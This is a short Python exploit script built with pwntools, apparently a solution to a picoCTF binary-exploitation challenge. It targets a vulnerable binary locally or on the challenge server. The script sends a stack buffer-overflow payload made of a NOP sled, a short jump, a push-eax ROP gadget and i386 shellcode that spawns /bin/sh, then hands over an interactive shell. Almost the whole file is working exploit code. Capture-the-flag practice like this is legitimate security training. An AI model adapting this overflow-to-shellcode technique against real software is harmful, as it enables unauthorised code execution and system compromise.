#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 60197)

    return r


def main():
    r = conn()

    # Offset to retaddr = 28
    payload = b'\x90' * 26
    payload += b'\xeb\x04' # jmp short (4 bytes)

    # ROP to shellcode
    push_eax_gadget = 0x80b06da # Addr from xgadget
    payload += p32(push_eax_gadget)

    # Lastly, append shellcode
    sc = asm(pwnlib.shellcraft.i386.linux.sh())
    payload += sc

    # print("sc = \n" + sc)
    # log.info(f"{len(sc_bytes)=}\n")

    # Send payload
    r.sendlineafter(b'hopper!\n', payload)

    r.interactive()


if __name__ == "__main__":
    main()
